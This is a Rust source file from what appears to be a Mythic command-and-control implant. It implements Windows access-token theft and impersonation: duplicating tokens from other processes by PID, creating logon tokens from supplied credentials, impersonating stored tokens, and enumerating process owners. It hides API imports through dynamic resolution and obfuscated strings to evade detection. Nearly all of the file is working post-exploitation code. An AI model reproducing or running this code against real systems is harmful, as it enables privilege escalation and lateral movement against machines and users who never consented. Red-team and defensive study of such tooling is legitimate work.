use crate::{AgentTask, mythic_success, mythic_error};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::sync::Mutex;

#[cfg(target_os = "windows")]
use winapi::um::winnt::{
    SecurityImpersonation, TokenPrimary, HANDLE, MAXIMUM_ALLOWED,
    PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE,
};

#[cfg(target_os = "windows")]
const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
#[cfg(target_os = "windows")]
const LOGON32_PROVIDER_DEFAULT: u32 = 0;

#[derive(Serialize, Clone)]
struct TokenEntry {
    id: usize,
    #[serde(skip)]
    handle: usize,
    username: String,
    token_type: String,
}

static TOKEN_STORE: Lazy<Mutex<Vec<TokenEntry>>> = Lazy::new(|| Mutex::new(Vec::new()));
static TOKEN_COUNTER: Lazy<Mutex<usize>> = Lazy::new(|| Mutex::new(1));

#[derive(Deserialize)]
struct TokenStealArgs {
    pid: u32,
}

#[derive(Deserialize)]
struct TokenMakeArgs {
    domain: String,
    username: String,
    password: String,
}

#[derive(Deserialize)]
struct TokenUseArgs {
    token_id: usize,
}

pub fn token_list(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let store = TOKEN_STORE.lock().unwrap();
    let tokens: Vec<_> = store.iter().map(|t| {
        serde_json::json!({
            "id": t.id,
            "username": t.username,
            "type": t.token_type,
        })
    }).collect();

    let output = if tokens.is_empty() {
        crate::obfstr::d(crate::obfstr::S_TOKEN_LIST_EMPTY)
    } else {
        serde_json::to_string_pretty(&tokens)?
    };

    Ok(mythic_success!(task.id, output))
}

#[cfg(target_os = "windows")]
pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenStealArgs = serde_json::from_str(&task.parameters)?;

    unsafe {
        // Type definitions for dynamically resolved functions
        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
        type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
        type DuplicateTokenExFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void, u32, u32, *mut *mut std::ffi::c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        // Dynamically resolve APIs
        let open_process: OpenProcessFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "OpenProcess")
                .ok_or_else(|| format!("{} OpenProcess", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN)))?
        );
        let open_process_token: OpenProcessTokenFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "OpenProcessToken")
                .ok_or_else(|| format!("{} OpenProcessToken", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN)))?
        );
        let duplicate_token_ex: DuplicateTokenExFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "DuplicateTokenEx")
                .ok_or_else(|| format!("{} DuplicateTokenEx", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP)))?
        );
        let close_handle: CloseHandleFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
                .ok_or_else(|| "CloseHandle resolve failed".to_string())?
        );

        let process_handle = open_process(PROCESS_QUERY_INFORMATION, 0, args.pid);
        if process_handle.is_null() {
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN), args.pid)));
        }

        let mut token_handle: HANDLE = std::ptr::null_mut();
        if open_process_token(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
            close_handle(process_handle);
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN), args.pid)));
        }

        let mut duplicated_token: HANDLE = std::ptr::null_mut();
        let result = duplicate_token_ex(
            token_handle,
            MAXIMUM_ALLOWED,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicated_token,
        );

        close_handle(token_handle);
        close_handle(process_handle);

        if result == 0 {
            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP), args.pid)));
        }

        let mut counter = TOKEN_COUNTER.lock().unwrap();
        let token_id = *counter;
        *counter += 1;
        drop(counter);

        let entry = TokenEntry {
            id: token_id,
            handle: duplicated_token as usize,
            username: format!("pid:{}", args.pid),
            token_type: "stolen".to_string(),
        };

        TOKEN_STORE.lock().unwrap().push(entry);

        Ok(mythic_success!(task.id, format!("{} {} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_STOLEN), args.pid, token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token stealing {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenMakeArgs = serde_json::from_str(&task.parameters)?;

    let domain: Vec<u16> = args.domain.encode_utf16().chain(std::iter::once(0)).collect();
    let username: Vec<u16> = args.username.encode_utf16().chain(std::iter::once(0)).collect();
    let password: Vec<u16> = args.password.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Type definition for dynamically resolved function
        type LogonUserWFn = unsafe extern "system" fn(*const u16, *const u16, *const u16, u32, u32, *mut *mut std::ffi::c_void) -> i32;

        // Dynamically resolve LogonUserW
        let logon_user_w: LogonUserWFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "LogonUserW")
                .ok_or_else(|| format!("{} LogonUserW", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_CREATE)))?
        );

        let mut token_handle: HANDLE = std::ptr::null_mut();
        let result = logon_user_w(
            username.as_ptr(),
            domain.as_ptr(),
            password.as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        );

        if result == 0 {
            return Ok(mythic_error!(task.id, format!("{} {}\\{}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_CREATE), args.domain, args.username)));
        }

        let mut counter = TOKEN_COUNTER.lock().unwrap();
        let token_id = *counter;
        *counter += 1;
        drop(counter);

        let entry = TokenEntry {
            id: token_id,
            handle: token_handle as usize,
            username: format!("{}\\{}", args.domain, args.username),
            token_type: "created".to_string(),
        };

        TOKEN_STORE.lock().unwrap().push(entry);

        Ok(mythic_success!(task.id, format!("{} {}\\{} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_CREATED), args.domain, args.username, token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token creation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: TokenUseArgs = serde_json::from_str(&task.parameters)?;

    let store = TOKEN_STORE.lock().unwrap();
    let entry = store.iter().find(|t| t.id == args.token_id);

    match entry {
        Some(token) => {
            let handle = token.handle as HANDLE;
            let username = token.username.clone();
            drop(store);

            unsafe {
                // Type definition for dynamically resolved function
                type ImpersonateLoggedOnUserFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

                // Dynamically resolve ImpersonateLoggedOnUser
                let impersonate_logged_on_user: ImpersonateLoggedOnUserFn = std::mem::transmute(
                    crate::winapi_resolve::resolve("advapi32.dll", "ImpersonateLoggedOnUser")
                        .ok_or_else(|| format!("{} ImpersonateLoggedOnUser", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP)))?
                );

                if impersonate_logged_on_user(handle) == 0 {
                    return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP), args.token_id)));
                }
            }

            Ok(mythic_success!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_TOKEN_IMPERSONATE), username)))
        }
        None => Ok(mythic_error!(task.id, format!("{} {} not found", crate::obfstr::d(crate::obfstr::S_TOKEN_NOT_FOUND), args.token_id)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token impersonation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    unsafe {
        // Type definition for dynamically resolved function
        type RevertToSelfFn = unsafe extern "system" fn() -> i32;

        // Dynamically resolve RevertToSelf
        let revert_to_self: RevertToSelfFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "RevertToSelf")
                .ok_or_else(|| crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT))?
        );

        if revert_to_self() == 0 {
            return Ok(mythic_error!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT)));
        }
    }

    Ok(mythic_success!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_REVERT)))
}

#[cfg(not(target_os = "windows"))]
pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("Token revert {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}

#[cfg(target_os = "windows")]
pub fn clear_all_tokens() -> usize {
    let mut store = TOKEN_STORE.lock().unwrap();
    unsafe {
        // Type definition for dynamically resolved function
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        // Dynamically resolve CloseHandle
        if let Some(ptr) = crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
            let close_handle: CloseHandleFn = std::mem::transmute(ptr);
            for entry in store.iter() {
                close_handle(entry.handle as HANDLE);
            }
        }
    }
    let count = store.len();
    store.clear();
    count
}

#[cfg(not(target_os = "windows"))]
pub fn clear_all_tokens() -> usize {
    let mut store = TOKEN_STORE.lock().unwrap();
    let count = store.len();
    store.clear();
    count
}

#[cfg(target_os = "windows")]
pub fn token_enum(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    use winapi::um::winnt::TOKEN_QUERY;

    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null() || snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Ok(mythic_error!(task.id, "Failed to create process snapshot"));
        }

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        let mut results: Vec<serde_json::Value> = Vec::new();

        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let pid = entry.th32ProcessID;
                let exe: String = entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as u8 as char)
                    .collect();

                let username = get_process_user(pid);

                results.push(serde_json::json!({
                    "pid": pid,
                    "name": exe,
                    "user": username,
                }));

                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snap);

        let output = serde_json::to_string_pretty(&results)?;
        Ok(mythic_success!(task.id, format!("Processes with token info ({} total):\n\n{}", results.len(), output)))
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_process_user(pid: u32) -> String {
    use winapi::um::winnt::{TokenUser, TOKEN_USER, TOKEN_QUERY};

    // Type definitions for dynamically resolved functions
    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
    type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
    type GetTokenInformationFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut u8, u32, *mut u32) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

    // Dynamically resolve APIs
    let open_process: OpenProcessFn = match crate::winapi_resolve::resolve("kernel32.dll", "OpenProcess") {
        Some(ptr) => std::mem::transmute(ptr),
        None => return "(resolve failed)".to_string(),
    };
    let open_process_token: OpenProcessTokenFn = match crate::winapi_resolve::resolve("advapi32.dll", "OpenProcessToken") {
        Some(ptr) => std::mem::transmute(ptr),
        None => return "(resolve failed)".to_string(),
    };
    let get_token_information: GetTokenInformationFn = match crate::winapi_resolve::resolve("advapi32.dll", "GetTokenInformation") {
        Some(ptr) => std::mem::transmute(ptr),
        None => return "(resolve failed)".to_string(),
    };
    let close_handle: CloseHandleFn = match crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
        Some(ptr) => std::mem::transmute(ptr),
        None => return "(resolve failed)".to_string(),
    };

    let process = open_process(0x0400, 0, pid); // PROCESS_QUERY_LIMITED_INFORMATION
    if process.is_null() {
        return "(access denied)".to_string();
    }

    let mut token: HANDLE = std::ptr::null_mut();
    if open_process_token(process, TOKEN_QUERY, &mut token) == 0 {
        close_handle(process);
        return "(no token)".to_string();
    }

    let mut buf = vec![0u8; 256];
    let mut len: u32 = 0;
    if get_token_information(token, TokenUser, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut len) == 0 {
        close_handle(token);
        close_handle(process);
        return "(unknown)".to_string();
    }

    let token_user = &*(buf.as_ptr() as *const TOKEN_USER);
    let sid = token_user.User.Sid;

    let username = sid_to_username(sid);

    close_handle(token);
    close_handle(process);
    username
}

#[cfg(target_os = "windows")]
unsafe fn sid_to_username(sid: winapi::um::winnt::PSID) -> String {
    use winapi::um::winbase::LookupAccountSidW;

    let mut name = vec![0u16; 256];
    let mut domain = vec![0u16; 256];
    let mut name_len: u32 = 256;
    let mut domain_len: u32 = 256;
    let mut sid_type: u32 = 0;

    if LookupAccountSidW(
        std::ptr::null(),
        sid,
        name.as_mut_ptr(),
        &mut name_len,
        domain.as_mut_ptr(),
        &mut domain_len,
        &mut sid_type,
    ) == 0 {
        return "(lookup failed)".to_string();
    }

    let domain_str: String = domain.iter().take_while(|&&c| c != 0).map(|&c| c as u8 as char).collect();
    let name_str: String = name.iter().take_while(|&&c| c != 0).map(|&c| c as u8 as char).collect();

    if domain_str.is_empty() {
        name_str
    } else {
        format!("{}\\{}", domain_str, name_str)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn token_enum(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, format!("token_enum {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
}
